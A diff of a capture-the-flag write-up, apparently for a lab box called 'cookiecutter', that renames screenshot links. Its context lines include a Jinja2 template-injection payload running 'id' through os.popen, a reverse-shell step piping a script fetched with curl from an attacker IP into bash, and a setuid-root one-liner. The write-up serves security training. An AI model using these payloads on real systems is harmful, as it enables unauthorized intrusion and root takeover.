@@ -20,11 +20,11 @@ PORT      STATE SERVICE
 
 Port 80 just shows a countdown:
 
-![](<../../../.gitbook/assets/image%20(3157).png>)
+![](../../../.gitbook/assets/cookiecutter-2.png)
 
 If we view the page source, there's this bit here:
 
-![](<../../../.gitbook/assets/image%20(2249).png>)
+![](../../../.gitbook/assets/cookiecutter-1.png)
 
 Here's the script:
 
@@ -208,7 +208,7 @@ $ python3 client.py  | base64 -d
 
 We can verify that Jinja2 injections work using `{{config.items()}}`
 
-![](<../../../.gitbook/assets/image%20(3889).png>)
+![](../../../.gitbook/assets/cookiecutter-5.png)
 
 Using this payload, we can verify the user:
 
@@ -216,11 +216,11 @@ Using this payload, we can verify the user:
 {{self.__init__.__globals__.__builtins__.__import__("os").popen("id").read()}}
 ```
 
-![](<../../../.gitbook/assets/image%20(3160).png>)
+![](../../../.gitbook/assets/cookiecutter-3.png)
 
 We can get a reverse shell using `curl <IP>/shell.sh|bash`:
 
-![](<../../../.gitbook/assets/image%20(3886).png>)
+![](../../../.gitbook/assets/cookiecutter-4.png)
 
 ## Privilege Escalation
 
@@ -272,7 +272,7 @@ This means we can make ourselves root using this one-liner:
 import os;os.setuid(0);os.system("/bin/bash")
 ```
 
-![](<../../../.gitbook/assets/image%20(3890).png>)
+![](../../../.gitbook/assets/cookiecutter-6.png)
 
 ## Scripts
 
